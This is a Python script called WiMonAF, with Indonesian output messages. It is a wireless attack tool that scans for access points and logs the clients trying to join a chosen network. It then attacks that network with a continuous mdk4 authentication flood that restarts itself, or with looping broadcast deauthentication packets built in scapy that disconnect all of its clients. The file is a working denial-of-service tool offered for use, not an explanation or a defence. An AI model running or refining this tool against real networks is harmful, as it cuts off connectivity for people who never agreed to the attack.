import threading
import subprocess
import time
import os
import argparse
import signal
from scapy.all import sniff, Dot11, Dot11Deauth, send
from datetime import datetime

log_file = f"authlog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
connected_clients = set()
stop_flag = threading.Event()
auth_flood_process = None
packet_sent_count = 0

def print_banner():
    print(r"""
 __        ___ _ __  ___  ___  _ __   ___ ___ 
 \ \ /\ / / _ \ '_ \/ __|/ _ \| '_ \ / __/ _ \
  \ V  V /  __/ | | \__ \ (_) | | | | (_|  __/
   \_/\_/ \___|_| |_|___/\___/|_| |_|\___\___|

        WiMonAF - Wireless Monitor & Auth Flood
                   by Rizq Osman
""")

def parse_args():
    parser = argparse.ArgumentParser(description="WiMonAF - Auth Flood + Client Monitor Tool")
    parser.add_argument("-i", "--interface", required=True, help="Interface dalam mode monitor")
    parser.add_argument("-b", "--bssid", help="MAC Address dari target AP")
    parser.add_argument("-s", "--ssid", help="Filter SSID (opsional)")
    parser.add_argument("--deauth", action="store_true", help="Gunakan serangan deauth jika PMF nonaktif")
    parser.add_argument("--version", action="store_true", help="Tampilkan versi WiMonAF")
    return parser.parse_args()

def log_to_file(line):
    with open(log_file, "a") as f:
        f.write(f"{datetime.now().isoformat()} {line}\n")

def scan_networks(interface):
    print("[*] Scanning jaringan untuk mendapatkan BSSID dan SSID...")
    aps = {}

    def handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
            ssid = pkt.info.decode(errors='ignore')
            bssid = pkt.addr2
            if bssid not in aps:
                aps[bssid] = ssid

    sniff(iface=interface, timeout=10, prn=handler, store=0)
    print("\nDaftar Access Point Ditemukan:")
    print("No.  SSID                           BSSID")
    print("---------------------------------------------------------")
    for i, (bssid, ssid) in enumerate(aps.items()):
        print(f"[{i}]  {ssid:<30} {bssid}")

    idx = int(input("\nPilih nomor target AP: "))
    bssid = list(aps.keys())[idx]
    ssid = aps[bssid]
    return bssid, ssid

def monitor_clients(interface, ssid_filter):
    lock = threading.Lock()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype in [0x04, 0x00]:
                mac = pkt.addr2
                ssid = pkt.info.decode(errors='ignore') if hasattr(pkt, 'info') else ''

                if ssid_filter in ssid or not ssid_filter:
                    with lock:
                        if mac not in connected_clients:
                            connected_clients.add(mac)
                            line = f"[Client] {mac} mencoba konek ke SSID '{ssid}'"
                            print(line)
                            log_to_file(line)
                            print(f"[+] Total client terdeteksi: {len(connected_clients)}")

    print("[*] Monitoring client yang mencoba konek ke SSID target...")
    sniff(iface=interface, prn=packet_handler, store=0, stop_filter=lambda x: stop_flag.is_set())

def start_auth_flood(interface, target_bssid):
    global auth_flood_process, packet_sent_count
    print("[*] Memulai Authentication Flood ke target...")
    while not stop_flag.is_set():
        try:
            auth_flood_process = subprocess.Popen([
                "mdk4", interface, "a", "-a", target_bssid, "-s", "1000"
            ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

            start_time = time.time()
            while auth_flood_process.poll() is None and not stop_flag.is_set():
                time.sleep(1)
                packet_sent_count += 1000
                uptime = int(time.time() - start_time)
                print(f"[*] mdk4 aktif | Durasi: {uptime}s | Paket terkirim: {packet_sent_count} | Client: {len(connected_clients)}")

            if not stop_flag.is_set():
                print("[!] mdk4 crash/dihentikan, mencoba ulang dalam 3 detik...")
                time.sleep(3)
        except Exception as e:
            print(f"[!] Error Auth Flood: {e}")
            time.sleep(3)

def send_deauth_packets(interface, target_bssid):
    print("[*] Mengirim paket deauth ke semua client dari BSSID:", target_bssid)
    pkt = Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    while not stop_flag.is_set():
        try:
            for _ in range(64):
                send(pkt, iface=interface, verbose=False)
            time.sleep(1)
        except Exception as e:
            print("[!] Gagal mengirim deauth packet:", e)

def stop_all():
    global auth_flood_process
    stop_flag.set()
    if auth_flood_process:
        auth_flood_process.terminate()

def main():
    args = parse_args()

    if args.version:
        print("WiMonAF v1.1 by Rizq Osman")
        return

    print_banner()

    if os.geteuid() != 0:
        print("[!] Jalankan script ini sebagai root.")
        return

    if not args.bssid or not args.ssid:
        args.bssid, args.ssid = scan_networks(args.interface)

    t1 = threading.Thread(target=monitor_clients, args=(args.interface, args.ssid))
    t1.start()

    if args.deauth:
        t2 = threading.Thread(target=send_deauth_packets, args=(args.interface, args.bssid))
    else:
        t2 = threading.Thread(target=start_auth_flood, args=(args.interface, args.bssid))

    t2.start()

    def signal_handler(sig, frame):
        print("\n[!] Menghentikan semua proses...")
        stop_all()
        t1.join()
        t2.join()
        print("[✓] Selesai.")
        exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.pause()

if __name__ == "__main__":
    main()

